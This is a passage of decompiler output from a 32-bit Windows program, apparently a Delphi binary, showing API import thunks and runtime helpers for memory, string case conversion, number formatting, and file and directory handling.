                    // WARNING: Could not recover jumptable at 0x00406cfc. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = CharLowerBuffA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPSTR __stdcall CharNextA(LPCSTR lpsz)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d04. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (LPSTR)CharNextA();
  return pCVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall CharToOemA(LPCSTR pSrc,LPSTR pDst)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d0c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CharToOemA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HICON __stdcall
CreateIcon(HINSTANCE hInstance,int nWidth,int nHeight,BYTE cPlanes,BYTE cBitsPixel,BYTE *lpbANDbits,
          BYTE *lpbXORbits)

{
  HICON pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d14. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HICON)CreateIcon();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall DestroyIcon(HICON hIcon)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d1c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DestroyIcon();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
DrawIconEx(HDC hdc,int xLeft,int yTop,HICON hIcon,int cxWidth,int cyWidth,UINT istepIfAniCur,
          HBRUSH hbrFlickerFreeDraw,UINT diFlags)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d24. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DrawIconEx();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall FillRect(HDC hDC,RECT *lprc,HBRUSH hbr)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d2c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = FillRect();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall GetClipboardData(UINT uFormat)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d34. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)GetClipboardData();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HDC __stdcall GetDC(HWND hWnd)

{
  HDC pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d3c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HDC)GetDC();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HWND __stdcall GetFocus(void)

{
  HWND pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d44. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HWND)GetFocus();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GetIconInfo(HICON hIcon,PICONINFO piconinfo)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d4c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetIconInfo();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetSysColor(int nIndex)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d54. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetSysColor();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall GetSystemMetrics(int nIndex)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d5c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetSystemMetrics();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HICON __stdcall LoadIconA(HINSTANCE hInstance,LPCSTR lpIconName)

{
  HICON pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d64. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HICON)LoadIconA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall LoadStringA(HINSTANCE hInstance,UINT uID,LPSTR lpBuffer,int cchBufferMax)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d6c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = LoadStringA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d74. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall ReleaseDC(HWND hWnd,HDC hDC)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d7c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = ReleaseDC();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall SystemParametersInfoA(UINT uiAction,UINT uiParam,PVOID pvParam,UINT fWinIni)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406d84. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SystemParametersInfoA();
  return BVar1;
}



undefined4 FUN_00406d8c(void)

{
  return 0;
}



void FUN_00406d90(UINT param_1,SIZE_T param_2)

{
  HGLOBAL hMem;
  
  hMem = GlobalAlloc(param_1,param_2);
  GlobalLock(hMem);
  return;
}



void FUN_00406da0(LPCVOID param_1,SIZE_T param_2,UINT param_3)

{
  HGLOBAL pvVar1;
  
  pvVar1 = GlobalHandle(param_1);
  GlobalUnlock(pvVar1);
  pvVar1 = GlobalReAlloc(pvVar1,param_2,param_3);
  GlobalLock(pvVar1);
  return;
}



void FUN_00406dbc(LPCVOID param_1)

{
  HGLOBAL hMem;
  
  hMem = GlobalHandle(param_1);
  GlobalUnlock(hMem);
  GlobalFree(hMem);
  return;
}



uint FUN_00406dd0(uint param_1,uint param_2)

{
  return param_1 | (param_2 & 0xff0000) << 8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00406ddc(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack16 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack16;
  _DAT_00442670 = _DAT_00442670 + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



void FUN_00407d5c(uint param_1,uint param_2,undefined2 *param_3,undefined2 *param_4)

{
  *param_3 = (short)(param_1 / (param_2 & 0xffff));
  *param_4 = (short)(param_1 % (param_2 & 0xffff));
  return;
}



void FUN_00407d78(int **param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040b978((int *)&DAT_00407810,'\x01',param_1);
  FUN_00404208((int)piVar1);
  return;
}



void FUN_00407d90(int **param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  
  iVar1 = FUN_0040b9b4((int)&DAT_00407810,'\x01',param_1,param_3,param_2);
  FUN_00404208(iVar1);
  return;
}



undefined4 * FUN_00407db4(uint param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_004026a8(param_1);
  FUN_004030a0(puVar1,param_1,0);
  return puVar1;
}



void FUN_00407dd4(byte *param_1,byte **param_2)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  
  uVar2 = FUN_00404a68((int)param_1);
  FUN_00404d98((int *)param_2,uVar2);
  pbVar3 = *param_2;
  for (; uVar2 != 0; uVar2 = uVar2 - 1) {
    bVar1 = *param_1;
    if ((0x60 < bVar1) && (bVar1 < 0x7b)) {
      bVar1 = bVar1 - 0x20;
    }
    *pbVar3 = bVar1;
    param_1 = param_1 + 1;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



void FUN_00407e10(byte *param_1,byte **param_2)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  
  uVar2 = FUN_00404a68((int)param_1);
  FUN_00404d98((int *)param_2,uVar2);
  pbVar3 = *param_2;
  for (; uVar2 != 0; uVar2 = uVar2 - 1) {
    bVar1 = *param_1;
    if ((0x40 < bVar1) && (bVar1 < 0x5b)) {
      bVar1 = bVar1 + 0x20;
    }
    *pbVar3 = bVar1;
    param_1 = param_1 + 1;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



undefined4 FUN_00407e4c(int *param_1,int *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  bool bVar5;
  
  uVar2 = param_3 & 3;
  iVar1 = (int)param_3 >> 2;
  bVar5 = iVar1 == 0;
  if (-1 < iVar1) {
    do {
      piVar3 = param_1;
      piVar4 = param_2;
      if (iVar1 == 0) break;
      iVar1 = iVar1 + -1;
      piVar4 = param_2 + 1;
      piVar3 = param_1 + 1;
      bVar5 = *param_1 == *param_2;
      param_1 = piVar3;
      param_2 = piVar4;
    } while (bVar5);
    if (!bVar5) {
      return 0;
    }
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      bVar5 = *(char *)piVar3 == *(char *)piVar4;
      piVar3 = (int *)((int)piVar3 + 1);
      piVar4 = (int *)((int)piVar4 + 1);
    } while (bVar5);
    if (!bVar5) {
      return 0;
    }
  }
  return 1;
}



int FUN_00407e6c(char *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  byte bVar6;
  ushort uVar7;
  byte bVar8;
  bool bVar9;
  
  pcVar3 = param_1;
  if (param_1 != (char *)0x0) {
    pcVar3 = *(char **)(param_1 + -4);
  }
  pcVar5 = param_2;
  if (param_2 != (char *)0x0) {
    pcVar5 = *(char **)(param_2 + -4);
  }
  pcVar4 = pcVar3;
  if (pcVar5 < pcVar3) {
    pcVar4 = pcVar5;
  }
  bVar9 = true;
LAB_00407e8b:
  do {
    if (pcVar4 != (char *)0x0) {
      pcVar4 = pcVar4 + -1;
      pcVar2 = param_2 + 1;
      pcVar1 = param_1 + 1;
      bVar9 = *param_1 == *param_2;
      param_1 = pcVar1;
      param_2 = pcVar2;
      if (bVar9) goto LAB_00407e8b;
    }
    if (bVar9) goto LAB_00407eb9;
    bVar6 = param_1[-1];
    if ((0x60 < bVar6) && (bVar6 < 0x7b)) {
      bVar6 = bVar6 - 0x20;
    }
    uVar7 = CONCAT11(param_2[-1],bVar6);
    bVar8 = (byte)((uint)uVar7 >> 8);
    if ((0x60 < bVar8) && (bVar8 < 0x7b)) {
      uVar7 = CONCAT11(bVar8 - 0x20,bVar6);
    }
    bVar6 = (byte)(uVar7 >> 8);
    bVar9 = (byte)uVar7 == bVar6;
    if (!bVar9) {
      pcVar3 = (char *)(uint)(byte)uVar7;
      pcVar5 = (char *)(uint)bVar6;
LAB_00407eb9:
      return (int)pcVar3 - (int)pcVar5;
    }
  } while( true );
}



undefined4 FUN_00407ec0(char *param_1,char *param_2)

{
  if (param_1 != param_2) {
    if (param_1 == (char *)0x0) {
      return 0;
    }
    if ((param_2 == (char *)0x0) || (*(int *)(param_1 + -4) != *(int *)(param_2 + -4))) {
      return 0;
    }
    param_1 = (char *)FUN_00407e6c(param_1,param_2);
    if (param_1 != (char *)0x0) {
      return 0;
    }
  }
  return CONCAT31((int3)((uint)param_1 >> 8),1);
}



void FUN_00407ee4(undefined *param_1,LPSTR *param_2)

{
  uint cchLength;
  undefined4 *puVar1;
  
  cchLength = FUN_00404a68((int)param_1);
  puVar1 = (undefined4 *)FUN_00404c68(param_1);
  FUN_00404898((int *)param_2,puVar1,cchLength);
  if (0 < (int)cchLength) {
    CharLowerBuffA(*param_2,cchLength);
  }
  return;
}



int FUN_00407f18(undefined *param_1,undefined *param_2)

{
  int iVar1;
  PCNZCH lpString2;
  int cchCount1;
  PCNZCH lpString1;
  
  iVar1 = FUN_00404a68((int)param_2);
  lpString2 = FUN_00404c68(param_2);
  cchCount1 = FUN_00404a68((int)param_1);
  lpString1 = FUN_00404c68(param_1);
  iVar1 = CompareStringA(0x400,0,lpString1,cchCount1,lpString2,iVar1);
  return iVar1 + -2;
}



int FUN_00407f50(undefined *param_1,undefined *param_2)

{
  int iVar1;
  PCNZCH lpString2;
  int cchCount1;
  PCNZCH lpString1;
  
  iVar1 = FUN_00404a68((int)param_2);
  lpString2 = FUN_00404c68(param_2);
  cchCount1 = FUN_00404a68((int)param_1);
  lpString1 = FUN_00404c68(param_1);
  iVar1 = CompareStringA(0x400,1,lpString1,cchCount1,lpString2,iVar1);
  return iVar1 + -2;
}



uint FUN_00407f88(undefined *param_1,undefined *param_2)

{
  uint uVar1;
  
  uVar1 = FUN_00407f50(param_1,param_2);
  return uVar1 & 0xffffff00 | (uint)(uVar1 == 0);
}



void FUN_00407fa0(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = FUN_00404a68(param_1);
  for (iVar2 = 1; (iVar2 <= iVar1 && (*(byte *)(param_1 + -1 + iVar2) < 0x21)); iVar2 = iVar2 + 1) {
  }
  if (iVar1 < iVar2) {
    FUN_004047a8(param_2);
  }
  else {
    for (; *(byte *)(param_1 + -1 + iVar1) < 0x21; iVar1 = iVar1 + -1) {
    }
    FUN_00404cc8(param_1,iVar2,(iVar1 - iVar2) + 1,param_2);
  }
  return;
}



void FUN_00407ff0(uint param_1,uint param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  byte bVar3;
  int iVar5;
  byte *unaff_ESI;
  byte *pbVar6;
  char cVar4;
  
  pbVar6 = unaff_ESI;
  if ((char)param_3 == '\0') {
    if ((int)param_1 < 0) {
      FUN_00408006(-param_1,param_2);
      unaff_ESI[-1] = 0x2d;
      return;
    }
    param_3 = 10;
  }
  do {
    uVar2 = param_1 / param_3;
    pbVar6 = pbVar6 + -1;
    cVar4 = (char)(param_1 % param_3);
    bVar3 = cVar4 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = cVar4 + 0x37;
    }
    *pbVar6 = bVar3;
    param_1 = uVar2;
  } while (uVar2 != 0);
  iVar5 = param_2 - ((int)unaff_ESI - (int)pbVar6);
  if ((uint)((int)unaff_ESI - (int)pbVar6) <= param_2 && iVar5 != 0) {
    iVar1 = -iVar5;
    while (iVar5 = iVar5 + -1, iVar5 != 0) {
      (pbVar6 + iVar1)[iVar5] = 0x30;
    }
    pbVar6[iVar1] = 0x30;
  }
  return;
}



void FUN_00408006(uint param_1,uint param_2)

{
  ulonglong uVar1;
  int iVar2;
  byte bVar3;
  int iVar5;
  byte *unaff_ESI;
  byte *pbVar6;
  char cVar4;
  
  pbVar6 = unaff_ESI;
  do {
    uVar1 = (ulonglong)param_1;
    param_1 = param_1 / 10;
    pbVar6 = pbVar6 + -1;
    cVar4 = (char)(uVar1 % 10);
    bVar3 = cVar4 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = cVar4 + 0x37;
    }
    *pbVar6 = bVar3;
  } while (param_1 != 0);
  iVar5 = param_2 - ((int)unaff_ESI - (int)pbVar6);
  if ((uint)((int)unaff_ESI - (int)pbVar6) <= param_2 && iVar5 != 0) {
    iVar2 = -iVar5;
    while (iVar5 = iVar5 + -1, iVar5 != 0) {
      (pbVar6 + iVar2)[iVar5] = 0x30;
    }
    pbVar6[iVar2] = 0x30;
  }
  return;
}



void FUN_0040803c(uint param_1,int *param_2)

{
  uint extraout_ECX;
  
  FUN_00407ff0(param_1,0,0);
  FUN_00404898(param_2,(undefined4 *)&stack0xfffffffc,extraout_ECX);
  return;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_0040805c(ulonglong *param_1,uint param_2,short param_3)

{
  int iVar1;
  byte bVar2;
  int iVar3;
  byte *unaff_ESI;
  byte *pbVar4;
  float10 fVar5;
  float10 fVar6;
  float10 fVar7;
  int local_8;
  
  if (((char)param_3 == '\0') && (param_3 = 10, (*(uint *)((int)param_1 + 4) & 0x80000000) != 0)) {
    local_8 = -*(int *)param_1;
    FUN_00408090((ulonglong *)&local_8,param_2,10);
    unaff_ESI[-1] = 0x2d;
    return;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) == 0) {
    fVar7 = (float10)*param_1;
  }
  else {
    fVar7 = (float10)0x7fffffffffffffff + (float10)1 + (float10)(*param_1 & 0x7fffffffffffffff);
  }
  fVar5 = (float10)param_3;
  pbVar4 = unaff_ESI;
  do {
    pbVar4 = pbVar4 + -1;
    fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;
    fVar7 = fVar7 / fVar5;
    local_8._0_1_ = (char)(short)ROUND(fVar6);
    bVar2 = (char)local_8 + 0x30;
    if (0x39 < bVar2) {
      bVar2 = (char)local_8 + 0x37;
    }
    *pbVar4 = bVar2;
  } while ((float10)1 <= fVar7);
  iVar3 = param_2 - ((int)unaff_ESI - (int)pbVar4);
  if ((uint)((int)unaff_ESI - (int)pbVar4) <= param_2 && iVar3 != 0) {
    iVar1 = -iVar3;
    while (iVar3 = iVar3 + -1, iVar3 != 0) {
      (pbVar4 + iVar1)[iVar3] = 0x30;
    }
    pbVar4[iVar1] = 0x30;
  }
  return;
}



void FUN_00408090(ulonglong *param_1,uint param_2,short param_3)

{
  int iVar1;
  byte bVar2;
  int iVar3;
  byte *unaff_ESI;
  byte *pbVar4;
  float10 fVar5;
  float10 fVar6;
  float10 fVar7;
  char local_8;
  
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) == 0) {
    fVar7 = (float10)*param_1;
  }
  else {
    fVar7 = (float10)0x7fffffffffffffff + (float10)1 + (float10)(*param_1 & 0x7fffffffffffffff);
  }
  fVar5 = (float10)param_3;
  pbVar4 = unaff_ESI;
  do {
    pbVar4 = pbVar4 + -1;
    fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;
    fVar7 = fVar7 / fVar5;
    local_8 = (char)(short)ROUND(fVar6);
    bVar2 = local_8 + 0x30;
    if (0x39 < bVar2) {
      bVar2 = local_8 + 0x37;
    }
    *pbVar4 = bVar2;
  } while ((float10)1 <= fVar7);
  iVar3 = param_2 - ((int)unaff_ESI - (int)pbVar4);
  if ((uint)((int)unaff_ESI - (int)pbVar4) <= param_2 && iVar3 != 0) {
    iVar1 = -iVar3;
    while (iVar3 = iVar3 + -1, iVar3 != 0) {
      (pbVar4 + iVar1)[iVar3] = 0x30;
    }
    pbVar4[iVar1] = 0x30;
  }
  return;
}



void FUN_00408128(int *param_1,undefined param_2,undefined param_3,undefined param_4)

{
  uint extraout_ECX;
  
  FUN_0040805c((ulonglong *)&param_4,0,0);
  FUN_00404898(param_1,(undefined4 *)&stack0xfffffff8,extraout_ECX);
  return;
}



void FUN_00408150(uint param_1,uint param_2,int *param_3)

{
  uint extraout_ECX;
  
  if (0x20 < param_2) {
    param_2 = 0;
  }
  FUN_00407ff0(param_1,param_2,0x10);
  FUN_00404898(param_3,(undefined4 *)&stack0xfffffffc,extraout_ECX);
  return;
}



byte * FUN_00408178(byte *param_1)

{
  byte *pbVar1;
  int local_14;
  byte *local_10;
  undefined local_c;
  
  pbVar1 = FUN_004033dc(param_1,&local_14);
  if (local_14 != 0) {
    local_c = 0xb;
    local_10 = param_1;
    FUN_00407d90(PTR_PTR_DAT_00441430,&local_10,0);
  }
  return pbVar1;
}



byte * FUN_004081b4(byte *param_1,byte *param_2,int param_3)

{
  byte *pbVar1;
  int local_8;
  
  local_8 = param_3;
  pbVar1 = FUN_004033dc(param_1,&local_8);
  if (local_8 != 0) {
    pbVar1 = param_2;
  }
  return pbVar1;
}



uint FUN_004081cc(byte *param_1,byte **param_2,int param_3)

{
  byte *pbVar1;
  int local_c;
  
  local_c = param_3;
  pbVar1 = FUN_004033dc(param_1,&local_c);
  *param_2 = pbVar1;
  return (uint)pbVar1 & 0xffffff00 | (uint)(local_c == 0);
}



void FUN_004081ec(void)

{
  int iVar1;
  
  iVar1 = FUN_0040578c((int)DAT_00442780);
  if (iVar1 == 0) {
    FUN_00405948(&DAT_00442780,(int)&DAT_00407bbc,1);
    FUN_004047fc(DAT_00442780,(undefined4 *)&DAT_00408264);
  }
  iVar1 = FUN_0040578c((int)DAT_00442784);
  if (iVar1 == 0) {
    FUN_00405948(&DAT_00442784,(int)&DAT_00407be0,1);
    FUN_004047fc(DAT_00442784,(undefined4 *)"False");
  }
  return;
}



uint FUN_0040827c(undefined4 *param_1,int param_2,undefined4 param_3,int param_4)

{
  undefined4 *puVar1;
  int iVar2;
  uint uStack8;
  
  uStack8 = 0;
  if (-1 < param_2) {
    iVar2 = param_2 + 1;
    puVar1 = param_1;
    do {
      param_1 = (undefined4 *)FUN_00407f88(*(undefined **)(param_4 + -4),(undefined *)*puVar1);
      if ((char)param_1 != '\0') {
        uStack8 = 0x1000000;
        break;
      }
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  }
  return (uint)param_1 & 0xffffff00 | uStack8 >> 0x18;
}



uint FUN_004082b8(undefined *param_1,undefined *param_2)

{
  uint uVar1;
  int iVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined *puVar3;
  undefined *puVar4;
  float10 local_14;
  undefined *local_8;
  
  puVar3 = &stack0xfffffffc;
  puVar4 = &stack0xfffffffc;
  local_8 = param_1;
  uVar1 = FUN_00409708(param_1,&local_14);
  if ((char)uVar1 == '\0') {
    FUN_004081ec();
    iVar2 = FUN_00405794((int)DAT_00442780);
    uVar1 = FUN_0040827c(DAT_00442780,iVar2,extraout_ECX,(int)puVar3);
    if ((char)uVar1 == '\0') {
      iVar2 = FUN_00405794((int)DAT_00442784);
      uVar1 = FUN_0040827c(DAT_00442784,iVar2,extraout_ECX_00,(int)puVar4);
      if ((char)uVar1 != '\0') {
        *param_2 = 0;
      }
    }
    else {
      *param_2 = 1;
    }
  }
  else {
    *param_2 = local_14 != (float10)0.0;
  }
  return uVar1;
}



void FUN_00408354(byte param_1,char param_2,int *param_3)

{
  if (param_2 == '\0') {
    FUN_004047fc(param_3,(undefined4 *)(&PTR_DAT_0043f15c)[param_1]);
  }
  else {
    FUN_004081ec();
    if (param_1 == 0) {
      FUN_004047fc(param_3,(undefined4 *)*DAT_00442784);
      return;
    }
    FUN_004047fc(param_3,(undefined4 *)*DAT_00442780);
  }
  return;
}



HANDLE FUN_004083a0(undefined *param_1,uint param_2)

{
  HANDLE pvVar1;
  LPCSTR lpFileName;
  DWORD dwDesiredAccess;
  DWORD dwShareMode;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  
  pvVar1 = (HANDLE)0xffffffff;
  if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {
    pvVar1 = (HANDLE)0x0;
    dwFlagsAndAttributes = 0x80;
    dwCreationDisposition = 3;
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    dwShareMode = *(DWORD *)(&DAT_0043f170 + ((param_2 & 0xf0) >> 4) * 4);
    dwDesiredAccess = *(DWORD *)(&DAT_0043f164 + (param_2 & 3) * 4);
    lpFileName = FUN_00404c68(param_1);
    pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                         dwCreationDisposition,dwFlagsAndAttributes,pvVar1);
  }
  return pvVar1;
}



void FUN_004083f8(undefined *param_1)

{
  LPCSTR lpFileName;
  DWORD dwDesiredAccess;
  DWORD dwShareMode;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  HANDLE hTemplateFile;
  
  hTemplateFile = (HANDLE)0x0;
  dwFlagsAndAttributes = 0x80;
  dwCreationDisposition = 2;
  lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  dwShareMode = 0;
  dwDesiredAccess = 0xc0000000;
  lpFileName = FUN_00404c68(param_1);
  CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,
              dwFlagsAndAttributes,hTemplateFile);
  return;
}



void FUN_0040841c(undefined *param_1)

{
  FUN_004083f8(param_1);
  return;
}



DWORD FUN_00408424(HANDLE param_1,LPVOID param_2,DWORD param_3)

{
  BOOL BVar1;
  DWORD local_10;
  
  local_10 = param_3;
  BVar1 = ReadFile(param_1,param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
  if (BVar1 == 0) {
    local_10 = 0xffffffff;
  }
  return local_10;
}



DWORD FUN_00408450(HANDLE param_1,LPCVOID param_2,DWORD param_3)

{
  BOOL BVar1;
  DWORD local_10;
  
  local_10 = param_3;
  BVar1 = WriteFile(param_1,param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
  if (BVar1 == 0) {
    local_10 = 0xffffffff;
  }
  return local_10;
}



DWORD FUN_0040847c(HANDLE param_1,DWORD param_2,undefined4 param_3,LONG param_4,LONG param_5)

{
  DWORD DVar1;
  LONG local_8;
  
  local_8 = param_5;
  DVar1 = SetFilePointer(param_1,param_4,&local_8,param_2);
  return DVar1;
}



void FUN_004084b4(HANDLE param_1)

{
  CloseHandle(param_1);
  return;
}



undefined4 FUN_004084bc(undefined *param_1)

{
  LPCSTR lpFileName;
  HANDLE hFindFile;
  BOOL BVar1;
  LPWIN32_FIND_DATAA lpFindFileData;
  byte local_150;
  FILETIME local_13c [37];
  _FILETIME local_10;
  undefined4 local_8;
  
  lpFindFileData = (LPWIN32_FIND_DATAA)&local_150;
  lpFileName = FUN_00404c68(param_1);
  hFindFile = FindFirstFileA(lpFileName,lpFindFileData);
  if ((hFindFile != (HANDLE)0xffffffff) && (FindClose(hFindFile), (local_150 & 0x10) == 0)) {
    FileTimeToLocalFileTime(local_13c,&local_10);
    BVar1 = FileTimeToDosDateTime(&local_10,(LPWORD)((int)&local_8 + 2),(LPWORD)&local_8);
    if (BVar1 != 0) {
      return local_8;
    }
  }
  return 0xffffffff;
}



uint FUN_00408524(undefined *param_1)

{
  int iVar1;
  
  iVar1 = FUN_004084bc(param_1);
  return iVar1 + 1U & 0xffffff00 | (uint)(iVar1 + 1U != 0);
}



undefined4 FUN_00408534(undefined *param_1)

{
  LPCSTR lpFileName;
  DWORD DVar1;
  
  lpFileName = FUN_00404c68(param_1);
  DVar1 = GetFileAttributesA(lpFileName);
  if ((DVar1 != 0xffffffff) && ((DVar1 & 0x10) != 0)) {
    return CONCAT31((int3)(DVar1 >> 8),1);
  }
  return 0;
}



void FUN_00408558(uint *param_1)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 *in_FS_OFFSET;
  undefined uVar5;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  uint *local_14;
  uint *local_10;
  int local_c;
  uint *local_8;
  
  local_c = 0;
  local_10 = (uint *)0x0;
  local_14 = (uint *)0x0;
  puStack28 = (undefined *)0x40856d;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack32 = &LAB_00408630;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puStack28 = &stack0xfffffffc;
  if (local_8 == (uint *)0x0) {
    puStack28 = &stack0xfffffffc;
    piVar2 = FUN_0040b978((int *)&DAT_0040732c,'\x01',(int **)PTR_LAB_004415a0);
    piVar2[3] = 3;
    FUN_00404208((int)piVar2);
  }
  FUN_0040c448(local_8,&local_c);
  FUN_00404840((int *)&local_8,local_c);
  iVar3 = FUN_00404a68((int)local_8);
  if (2 < iVar3) {
    uVar4 = FUN_00408534((undefined *)local_8);
    uVar5 = (char)uVar4 == '\0';
    if ((bool)uVar5) {
      FUN_0040883c((undefined *)local_8,(int *)&local_10);
      FUN_00404bb4(local_10,local_8);
      if (!(bool)uVar5) {
        FUN_0040883c((undefined *)local_8,(int *)&local_14);
        cVar1 = FUN_00408558(local_14);
        if (cVar1 != '\0') {
          FUN_004089a0((undefined *)local_8);
        }
      }
    }
  }
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00408637;
  puStack32 = (undefined *)0x40862f;
  FUN_004047cc((int *)&local_14,4);
  return;
}



DWORD FUN_00408640(LPWORD param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  _FILETIME local_c;
  
  do {
    if ((*(uint *)(param_1 + 0xc) & *(uint *)(param_1 + 8)) == 0) {
      FileTimeToLocalFileTime((FILETIME *)(param_1 + 0x16),&local_c);
      FileTimeToDosDateTime(&local_c,param_1 + 1,param_1);
      *(undefined4 *)(param_1 + 2) = *(undefined4 *)(param_1 + 0x1c);
      *(undefined4 *)(param_1 + 4) = *(undefined4 *)(param_1 + 0xc);
      FUN_00404a18((int *)(param_1 + 6),(undefined4 *)(param_1 + 0x22),0x104);
      return 0;
    }
    BVar1 = FindNextFileA(*(HANDLE *)(param_1 + 10),(LPWIN32_FIND_DATAA)(param_1 + 0xc));
  } while (BVar1 != 0);
  DVar2 = GetLastError();
  return DVar2;
}



DWORD FUN_004086a4(undefined *param_1,uint param_2,LPWORD param_3)

{
  LPCSTR lpFileName;
  HANDLE pvVar1;
  DWORD DVar2;
  LPWIN32_FIND_DATAA lpFindFileData;
  
  *(uint *)(param_3 + 8) = ~param_2 & 0x1e;
  lpFindFileData = (LPWIN32_FIND_DATAA)(param_3 + 0xc);
  lpFileName = FUN_00404c68(param_1);
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  *(HANDLE *)(param_3 + 10) = pvVar1;
  if (pvVar1 == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
  }
  else {
    DVar2 = FUN_00408640(param_3);
    if (DVar2 != 0) {
      FUN_00408718((int)param_3);
    }
  }
  return DVar2;
}



